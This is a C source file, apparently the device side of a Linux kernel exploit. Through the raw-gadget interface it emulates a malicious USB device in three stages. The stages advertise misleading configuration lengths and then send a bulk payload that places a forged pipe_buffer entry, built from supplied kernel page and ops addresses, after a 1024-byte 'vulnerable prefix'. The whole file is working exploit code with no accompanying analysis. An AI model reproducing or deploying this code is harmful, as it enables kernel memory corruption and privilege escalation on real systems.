// SPDX-License-Identifier: GPL-2.0
#define _GNU_SOURCE
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/usb/ch9.h>
#include <linux/usb/raw_gadget.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define PIPE_CONFIG_LENGTH 1024
#define SEQ_CONFIG_LENGTH 32
#define HELPER_CONFIG_COUNT 8
#define SEQ_CONFIG_COUNT 8
#define PAGE_SIZE 4096
#define RECORD_COUNT 65
#define RECORD_SIZE 16
#define KAPO_REQUEST_RECORD_COUNT 0x5a
#define KAPO_REQUEST_TRANSFER_CONTEXT 0x5b
#define KAPO_REQUEST_NEXT_STAGE 0x5c
#define VULNERABLE_PREFIX_SIZE 1024
#define PIPE_BUFFER_PAGE 0
#define PIPE_BUFFER_OFFSET 8
#define PIPE_BUFFER_LEN 12
#define TRANSFER_CONTEXT_SIZE 24
#define SHORT_CONFIGURATION_LENGTH (USB_DT_CONFIG_SIZE + \
	USB_DT_INTERFACE_SIZE + USB_DT_ENDPOINT_SIZE)
#define IO_DATA_LENGTH PIPE_CONFIG_LENGTH

struct control_event {
	struct usb_raw_event event;
	struct usb_ctrlrequest control;
};

struct control_io {
	struct usb_raw_ep_io io;
	uint8_t data[IO_DATA_LENGTH];
};

static struct usb_device_descriptor device_descriptor = {
	.bLength = USB_DT_DEVICE_SIZE,
	.bDescriptorType = USB_DT_DEVICE,
	.bcdUSB = __constant_cpu_to_le16(0x0200),
	.bMaxPacketSize0 = 64,
	.idVendor = __constant_cpu_to_le16(0xcafe),
	.idProduct = __constant_cpu_to_le16(0x6801),
	.bNumConfigurations = 1,
};

static struct {
	struct usb_config_descriptor configuration;
	struct usb_interface_descriptor interface;
	struct usb_endpoint_descriptor endpoint;
} __attribute__((packed)) short_configuration = {
	.configuration = {
		.bLength = USB_DT_CONFIG_SIZE,
		.bDescriptorType = USB_DT_CONFIG,
		.wTotalLength = __constant_cpu_to_le16(PIPE_CONFIG_LENGTH),
		.bNumInterfaces = 1,
		.bConfigurationValue = 1,
		.bmAttributes = USB_CONFIG_ATT_ONE | USB_CONFIG_ATT_SELFPOWER,
	},
	.interface = {
		.bLength = USB_DT_INTERFACE_SIZE,
		.bDescriptorType = USB_DT_INTERFACE,
		.bNumEndpoints = 1,
		.bInterfaceClass = USB_CLASS_VENDOR_SPEC,
		.bInterfaceSubClass = 0x42,
		.bInterfaceProtocol = 0x01,
	},
	.endpoint = {
		.bLength = USB_DT_ENDPOINT_SIZE,
		.bDescriptorType = USB_DT_ENDPOINT,
		.bEndpointAddress = USB_DIR_IN | 1,
		.bmAttributes = USB_ENDPOINT_XFER_BULK,
		.wMaxPacketSize = __constant_cpu_to_le16(512),
	},
};

static int bulk_in_endpoint;
static uint8_t record_payload[RECORD_COUNT * RECORD_SIZE];

enum kapo_mode {
	KAPO_MODE_HELPER,
	KAPO_MODE_SEQ,
	KAPO_MODE_STAGE2,
};

static enum kapo_mode active_mode;

static void fail(const char *operation)
{
	perror(operation);
	exit(EXIT_FAILURE);
}

static void reply(int fd, const void *data, uint32_t length,
		  uint16_t requested_length)
{
	struct control_io transfer = { .io.ep = 0 };

	if (length > requested_length)
		length = requested_length;
	transfer.io.length = length;
	if (length)
		memcpy(transfer.data, data, length);
	if (ioctl(fd, USB_RAW_IOCTL_EP0_WRITE, &transfer) < 0)
		fail("USB_RAW_IOCTL_EP0_WRITE");
}

static void acknowledge_out(int fd)
{
	struct control_io transfer = { .io.ep = 0 };

	if (ioctl(fd, USB_RAW_IOCTL_EP0_READ, &transfer) < 0)
		fail("USB_RAW_IOCTL_EP0_READ");
}

static uint32_t get_le32(const uint8_t *at)
{
	uint32_t value;

	memcpy(&value, at, sizeof(value));
	return le32toh(value);
}

static uint64_t get_le64(const uint8_t *at)
{
	uint64_t value;

	memcpy(&value, at, sizeof(value));
	return le64toh(value);
}

static void receive_transfer_context(int fd, uint16_t requested_length)
{
	struct control_io transfer = { .io.ep = 0 };
	uint8_t *entry = record_payload + VULNERABLE_PREFIX_SIZE;
	uint64_t page, ops;
	uint32_t offset, reserved;

	if (requested_length != TRANSFER_CONTEXT_SIZE) {
		fprintf(stderr, "transfer context: expected %d bytes, got %u\n",
			TRANSFER_CONTEXT_SIZE, requested_length);
		exit(EXIT_FAILURE);
	}
	transfer.io.length = requested_length;
	if (ioctl(fd, USB_RAW_IOCTL_EP0_READ, &transfer) < 0)
		fail("read transfer context");
	page = get_le64(transfer.data);
	ops = get_le64(transfer.data + 8);
	offset = get_le32(transfer.data + 16);
	reserved = get_le32(transfer.data + 20);
	if (!page || !ops || offset > PAGE_SIZE - 2 || reserved) {
		fprintf(stderr, "transfer context: invalid fields\n");
		exit(EXIT_FAILURE);
	}
	memset(record_payload, 0, sizeof(record_payload));
	memcpy(entry + PIPE_BUFFER_PAGE, transfer.data, sizeof(page));
	{
		const uint32_t pipe_offset = 0;
		const uint32_t length = htole32(offset + 1);

		memcpy(entry + PIPE_BUFFER_OFFSET, &pipe_offset,
		       sizeof(pipe_offset));
		memcpy(entry + PIPE_BUFFER_LEN, &length, sizeof(length));
	}
}

static void *send_records(void *argument)
{
	struct {
		struct usb_raw_ep_io io;
		uint8_t data[RECORD_COUNT * RECORD_SIZE];
	} transfer = { .io.length = sizeof(transfer.data) };
	int fd = (int)(intptr_t)argument;
	int result;

	transfer.io.ep = bulk_in_endpoint;
	memcpy(transfer.data, record_payload, sizeof(transfer.data));
	result = ioctl(fd, USB_RAW_IOCTL_EP_WRITE, &transfer);
	if (result < 0)
		fail("USB_RAW_IOCTL_EP_WRITE");
	if ((size_t)result != sizeof(transfer.data)) {
		fprintf(stderr, "USB_RAW_IOCTL_EP_WRITE: wrote %d of %zu bytes\n",
			result, sizeof(transfer.data));
		exit(EXIT_FAILURE);
	}
	return NULL;
}

static void wait_until_ready(const char *path, enum kapo_mode mode)
{
	static const char *const names[] = { "helper", "seq", "stage2" };
	char line[32];
	ssize_t length;
	int fd;

	fd = open(path, O_RDONLY);
	if (fd < 0)
		fail(path);
	length = read(fd, line, sizeof(line) - 1);
	if (length < 0)
		fail("read readiness signal");
	line[length] = '\0';
	if (close(fd))
		fail("close readiness signal");
	if (length && line[length - 1] == '\n')
		line[length - 1] = '\0';
	if (strcmp(line, names[mode])) {
		fprintf(stderr, "expected readiness signal '%s', got '%s'\n",
			names[mode], line);
		exit(EXIT_FAILURE);
	}
}

static void run_mode(enum kapo_mode mode)
{
	struct usb_raw_init init = { .speed = USB_SPEED_HIGH };
	struct control_event event;
	int fd;

	active_mode = mode;
	device_descriptor.bNumConfigurations = mode == KAPO_MODE_HELPER ?
		HELPER_CONFIG_COUNT : mode == KAPO_MODE_SEQ ? SEQ_CONFIG_COUNT : 1;
	short_configuration.configuration.wTotalLength = htole16(
		mode == KAPO_MODE_SEQ ? SEQ_CONFIG_LENGTH : PIPE_CONFIG_LENGTH);

	strcpy((char *)init.driver_name, "dummy_udc");
	strcpy((char *)init.device_name, "dummy_udc.0");
	fd = open("/dev/raw-gadget", O_RDWR);
	if (fd < 0)
		fail("open /dev/raw-gadget");
	if (ioctl(fd, USB_RAW_IOCTL_INIT, &init) < 0)
		fail("USB_RAW_IOCTL_INIT");
	if (ioctl(fd, USB_RAW_IOCTL_RUN) < 0)
		fail("USB_RAW_IOCTL_RUN");

	for (;;) {
		uint16_t value, length;

		event.event.type = USB_RAW_EVENT_INVALID;
		event.event.length = sizeof(event.control);
		if (ioctl(fd, USB_RAW_IOCTL_EVENT_FETCH, &event) < 0)
			fail("USB_RAW_IOCTL_EVENT_FETCH");
		if (event.event.type != USB_RAW_EVENT_CONTROL)
			continue;

		value = le16toh(event.control.wValue);
		length = le16toh(event.control.wLength);
		if (event.control.bRequest == USB_REQ_GET_DESCRIPTOR &&
		    (value >> 8) == USB_DT_DEVICE) {
			reply(fd, &device_descriptor, sizeof(device_descriptor), length);
		} else if (event.control.bRequest == USB_REQ_GET_DESCRIPTOR &&
			   (value >> 8) == USB_DT_CONFIG) {
			__typeof__(short_configuration) response = short_configuration;

			response.configuration.bConfigurationValue = (value & 0xff) + 1;
			reply(fd, &response, SHORT_CONFIGURATION_LENGTH, length);
		} else if (event.control.bRequest == USB_REQ_SET_CONFIGURATION) {
			bulk_in_endpoint = ioctl(fd, USB_RAW_IOCTL_EP_ENABLE,
						 &short_configuration.endpoint);
			if (bulk_in_endpoint < 0)
				fail("USB_RAW_IOCTL_EP_ENABLE");
			if (ioctl(fd, USB_RAW_IOCTL_CONFIGURE) < 0)
				fail("USB_RAW_IOCTL_CONFIGURE");
			acknowledge_out(fd);
		} else if ((event.control.bRequestType & USB_TYPE_MASK) ==
			   USB_TYPE_VENDOR &&
			   (event.control.bRequestType & USB_DIR_IN) == USB_DIR_OUT &&
			   event.control.bRequest == KAPO_REQUEST_TRANSFER_CONTEXT) {
			if (mode != KAPO_MODE_STAGE2)
				goto stall;
			receive_transfer_context(fd, length);
		} else if ((event.control.bRequestType & USB_TYPE_MASK) ==
			   USB_TYPE_VENDOR &&
			   event.control.bRequest == KAPO_REQUEST_RECORD_COUNT) {
			const uint16_t count = htole16(RECORD_COUNT);
			pthread_t thread;

			if (mode != KAPO_MODE_STAGE2)
				goto stall;
			reply(fd, &count, sizeof(count), length);
			if (pthread_create(&thread, NULL, send_records,
					   (void *)(intptr_t)fd))
				fail("pthread_create");
			pthread_detach(thread);
		} else if ((event.control.bRequestType & USB_TYPE_MASK) ==
			   USB_TYPE_VENDOR &&
			   (event.control.bRequestType & USB_DIR_IN) == USB_DIR_OUT &&
			   event.control.bRequest == KAPO_REQUEST_NEXT_STAGE &&
			   mode != KAPO_MODE_STAGE2) {
			acknowledge_out(fd);
			usleep(100000);
			break;
		} else {
stall:
			if (ioctl(fd, USB_RAW_IOCTL_EP0_STALL) < 0 && errno != EBUSY)
				fail("USB_RAW_IOCTL_EP0_STALL");
		}
	}
	if (close(fd))
		fail("close /dev/raw-gadget");
}

int main(int argc, char **argv)
{
	const char *ready_path = "/tmp/kapo-usb-ready";
	int mode;

	if (argc > 2) {
		fprintf(stderr, "usage: %s [readiness-fifo]\n", argv[0]);
		return EXIT_FAILURE;
	}
	if (argc == 2)
		ready_path = argv[1];
	for (mode = KAPO_MODE_HELPER; mode <= KAPO_MODE_STAGE2; mode++) {
		wait_until_ready(ready_path, mode);
		run_mode(mode);
	}
	return EXIT_SUCCESS;
}
